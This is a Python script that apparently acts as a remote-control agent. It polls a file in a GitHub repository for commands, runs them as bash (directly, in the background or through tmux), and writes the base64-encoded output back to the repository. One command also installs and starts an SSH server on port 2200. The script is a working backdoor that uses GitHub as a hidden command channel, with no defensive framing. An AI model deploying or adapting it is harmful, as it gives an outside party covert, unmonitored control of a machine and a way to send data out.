import json, base64, time, subprocess, hashlib, urllib.request, urllib.error
def lg(m):
    open("/tmp/rel.log", "a").write(time.strftime("[%H:%M:%S]") + m + "\n")

REPO = "Setyoanugrah/molab-state"
G, O = "relay/cmd", "relay/out"
TK = open("/tmp/gh.tk").read().strip()
H = {"Authorization": "token " + TK, "Accept": "application/vnd.github+json",
     "User-Agent": "relay"}

def api(path, method="GET", body=None, etag=None):
    hd = dict(H)
    if etag:
        hd["If-None-Match"] = etag
    req = urllib.request.Request("https://api.github.com/" + path,
        headers=hd, data=json.dumps(body).encode() if body else None,
        method=method)
    try:
        r = urllib.request.urlopen(req)
        bt = r.read()
        return r.status, bt, r.headers.get("ETag")
    except urllib.error.HTTPError as e:
        return e.code, e.read(), e.headers.get("ETag") if e.headers else None

def put(path, content, msg="relay"):
    st, b, _ = api("repos/%s/contents/%s?ref=main" % (REPO, path))
    sha = json.loads(b)["sha"] if st == 200 else None
    body = {"message": msg, "content": base64.b64encode(content.encode()).decode()}
    if sha:
        body["sha"] = sha
    st, b, _ = api("repos/%s/contents/%s" % (REPO, path), "PUT", body)
    return st

seen = ""
try:
    seen = open("/tmp/rel.seen").read()
except Exception:
    pass
etag = None
while True:
    st, b, e2 = api("repos/%s/contents/%s?ref=main" % (REPO, G), etag=etag)
    if st == 200:
        etag = e2
        content_b64 = json.loads(b).get("content", "").replace("\n", "")
        content = base64.b64decode(content_b64).decode("utf-8", "replace")
        h = hashlib.sha256(content.encode()).hexdigest()[:16]
        if h != seen:
            if seen:
                open("/tmp/rel.seen.tmp", "w").write(seen)
                import shutil; shutil.copy("/tmp/rel.seen.tmp", "/tmp/rel.seen")
            seen = h
            lg("cmd sha %s" % h)
            content = content.rstrip("\n")
            lines = content.rsplit("\n", 1)
            callid = "0"
            if len(lines) == 2 and lines[1].startswith("#CALL:"):
                content, callid = lines[0], lines[1][6:]
            lg("callid " + callid)
            open("/tmp/cmd.sh", "w").write(content)
            open("/tmp/rel.seen", "w").write(h + "\n")
            if callid == "" or True:
                pass
            if content.startswith("@back "):
                back = content[6:].replace("#CALL:" + callid, "").strip()
                subprocess.Popen(["bash", "-c", back + " > /tmp/rel.bg.out 2>&1"], shell=False)
                out = b"BACKGROUND_QUEUED\n"
            elif content.startswith("@tmuxinit"):
                subprocess.run("which tmux >/dev/null || apt-get install -y -qq tmux > /dev/null 2>&1; tmux kill-session -t mol 2>/dev/null; (apt-get install -y -qq openssh-server >/dev/null 2>&1; mkdir -p /run/sshd; /usr/sbin/sshd -p 2200 2>/tmp/sshd2.log) ; export TMUX_TMPDIR=/tmp; nohup tmux new-session -d -s mol bash > /tmp/tmux.log 2>&1 &", shell=True, capture_output=True, timeout=110)
                time.sleep(10)
                o = subprocess.run("tmux ls 2>&1", shell=True, capture_output=True)
                out = b"TMUXINIT\n" + o.stdout + o.stderr
            elif content.startswith("@tmux "):
                tosend = content[6:].replace("#CALL:" + callid, "")
                o = subprocess.run('export TMUX_TMPDIR=/tmp; tmux send-keys -t mol -l %Q && tmux send-keys -t mol Enter; sleep 1; tmux capture-pane -t mol -p -S -30', shell=True, input=tosend.encode().replace(b"\'", b"'"), capture_output=True)
                out = o.stdout + b"\n==EOT==\n" + o.stderr
            elif content.startswith("@tail"):
                o = subprocess.run("tail -c 2000 /tmp/rel.bg.out 2>&1", shell=True, capture_output=True)
                out = o.stdout
            else:
                try:
                    p = subprocess.run(["bash", "/tmp/cmd.sh"], capture_output=True, timeout=110)
                    out = p.stdout + (b"\n==STDERR==\n" + p.stderr if p.stderr else b"")
                except subprocess.TimeoutExpired as t:
                    out = (t.stdout or b"") + b"\n==TIMEOUT 110s=="
            lg("exec done output %dB" % len(out))
            r2 = put(O, "RESULT:%s|%s" % (callid, base64.b64encode(out[:700000]).decode()))
            lg("put rc %s" % r2)
    time.sleep(3)

lg('agent-start')
